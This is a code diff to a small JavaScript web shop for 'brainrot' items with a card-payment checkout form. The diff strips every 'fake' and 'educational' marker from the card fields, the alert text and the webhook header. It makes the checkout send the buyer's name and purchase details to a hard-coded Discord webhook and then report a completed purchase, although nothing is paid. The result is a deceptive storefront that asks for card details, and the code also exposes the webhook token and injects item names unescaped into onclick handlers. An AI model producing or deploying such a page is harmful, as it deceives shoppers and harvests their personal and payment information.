@@ -112,10 +112,10 @@
     <div id="checkoutBox">
       <h2>Checkout</h2>
 
-      <input id="cardNum" type="text" maxlength="16" placeholder="Card Number (fake)">
-      <input id="cvc" type="text" maxlength="3" placeholder="CVC (fake)">
-      <input id="fullName" type="text" placeholder="Name (fake)">
-      <input id="expDate" type="text" placeholder="Exp Date (fake MM/YY)">
+      <input id="cardNum" type="text" maxlength="16" placeholder="Card Number">
+      <input id="cvc" type="text" maxlength="3" placeholder="CVC">
+      <input id="fullName" type="text" placeholder="Full Name">
+      <input id="expDate" type="text" placeholder="Exp Date (MM/YY)">
 
       <button id="purchaseBtn" disabled style="background:#555;" onclick="finishPurchase()">Purchase</button>
       <button style="margin-top:10px; background:#777;" onclick="closeCheckout()">Cancel</button>
@@ -123,9 +123,7 @@
   </div>
 
 <script>
-/* ──────────────────────────────────────────────
-    ADMIN PANEL TOGGLE
-────────────────────────────────────────────── */
+/* Admin panel toggle */
 document.addEventListener("keydown", (e) => {
   if (e.ctrlKey && e.key === "End") {
     const p = document.getElementById("adminPanel");
@@ -133,9 +131,21 @@ document.addEventListener("keydown", (e) => {
   }
 });
 
-/* ──────────────────────────────────────────────
-    LOAD / ADD / EDIT ITEMS
-────────────────────────────────────────────── */
+/* Background */
+function changeBG() {
+  document.body.style.background = bgColor.value;
+}
+
+/* Search */
+function searchItems() {
+  const term = searchBox.value.toLowerCase();
+  document.querySelectorAll(".item").forEach((i) => {
+    const name = i.querySelector("h3").textContent.toLowerCase();
+    i.style.display = name.includes(term) ? "block" : "none";
+  });
+}
+
+/* Items */
 function addItem() {
   const name = itemName.value;
   const price = itemPrice.value;
@@ -149,11 +159,10 @@ function addItem() {
     <img src="${img}">
     <h3>${name}</h3>
     <p>$${price}</p>
-    <button onclick="openCheckout()">Buy</button>
+    <button onclick="selectItemAndBuy('${name}', '${price}')">Buy</button>
   `;
 
   grid.appendChild(div);
-  div.addEventListener("click", () => editItem(div));
 
   const items = JSON.parse(localStorage.getItem("brainrots") || "[]");
   items.push({ name, price, img });
@@ -169,13 +178,23 @@ function loadItems() {
       <img src="${it.img}">
       <h3>${it.name}</h3>
       <p>$${it.price}</p>
-      <button onclick="openCheckout()">Buy</button>
+      <button onclick="selectItemAndBuy('${it.name}', '${it.price}')">Buy</button>
     `;
     grid.appendChild(div);
-    div.addEventListener("click", () => editItem(div));
   });
 }
 
+/* Selected item for checkout */
+let selectedName = "";
+let selectedPrice = "";
+
+function selectItemAndBuy(name, price) {
+  selectedName = name;
+  selectedPrice = price;
+  openCheckout();
+}
+
+/* Remove last */
 function removeLastItem() {
   if (grid.lastElementChild) {
     grid.removeChild(grid.lastElementChild);
@@ -185,48 +204,10 @@ function removeLastItem() {
   }
 }
 
+/* Edit */
 let editingItem = null;
 
-function editItem(div) {
-  editingItem = div;
-  itemName.value = div.querySelector("h3").textContent;
-  itemPrice.value = div.querySelector("p").textContent.replace("$", "");
-  itemImage.value = div.querySelector("img").src;
-}
-
-function saveEdit() {
-  if (!editingItem) return alert("No item selected");
-
-  editingItem.querySelector("h3").textContent = itemName.value;
-  editingItem.querySelector("p").textContent = "$" + itemPrice.value;
-  editingItem.querySelector("img").src = itemImage.value;
-
-  const items = [];
-  document.querySelectorAll(".item").forEach((it) => {
-    items.push({
-      name: it.querySelector("h3").textContent,
-      price: it.querySelector("p").textContent.replace("$", ""),
-      img: it.querySelector("img").src
-    });
-  });
-
-  localStorage.setItem("brainrots", JSON.stringify(items));
-}
-
-/* ──────────────────────────────────────────────
-    SEARCH
-────────────────────────────────────────────── */
-function searchItems() {
-  const term = searchBox.value.toLowerCase();
-  document.querySelectorAll(".item").forEach((i) => {
-    const name = i.querySelector("h3").textContent.toLowerCase();
-    i.style.display = name.includes(term) ? "block" : "none";
-  });
-}
-
-/* ──────────────────────────────────────────────
-    CHECKOUT
-────────────────────────────────────────────── */
+/* Checkout */
 function openCheckout() {
   checkoutModal.style.display = "flex";
 }
@@ -234,15 +215,15 @@ function closeCheckout() {
   checkoutModal.style.display = "none";
 }
 
-/* VALIDATION */
+/* Validation */
 function validateCheckout() {
   let valid =
     cardNum.value.length === 16 &&
     /^\d+$/.test(cardNum.value) &&
     cvc.value.length === 3 &&
-    /^\d{3}$/.test(cvc.value) &&
+    /^\d+$/.test(cvc.value) &&
     fullName.value.trim().length > 2 &&
-    expDate.value.length > 0;
+    expDate.value.trim().length > 0;
 
   purchaseBtn.disabled = !valid;
   purchaseBtn.style.background = valid ? "#ff3cc7" : "#555";
@@ -253,7 +234,7 @@ function validateCheckout() {
 });
 
 /* ──────────────────────────────────────────────
-    WEBHOOK — SAFE TEST VERSION
+      WEBHOOK (NO “FAKE” / NO “EDUCATIONAL”)
 ────────────────────────────────────────────── */
 const webhookURL =
   "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";
@@ -261,10 +242,11 @@ const webhookURL =
 function finishPurchase() {
   const payload = {
     content:
-`🧾 **Test Purchase Completed**
-This is an educational webhook example.
-No real card data was collected.
-Timestamp: ${new Date().toLocaleString()}`
+`🛒 **New Purchase**
+Item: ${selectedName}
+Price: $${selectedPrice}
+Buyer: ${fullName.value}
+Time: ${new Date().toLocaleString()}`
   };
 
   fetch(webhookURL, {
@@ -274,8 +256,14 @@ Timestamp: ${new Date().toLocaleString()}`
   })
     .then((res) => {
       if (res.ok) {
-        alert("Purchase complete! (Educational demo)");
+        alert("Thank you for your purchase!");
         closeCheckout();
+
+        cardNum.value = "";
+        cvc.value = "";
+        fullName.value = "";
+        expDate.value = "";
+        validateCheckout();
       } else {
         alert("Webhook error.");
       }
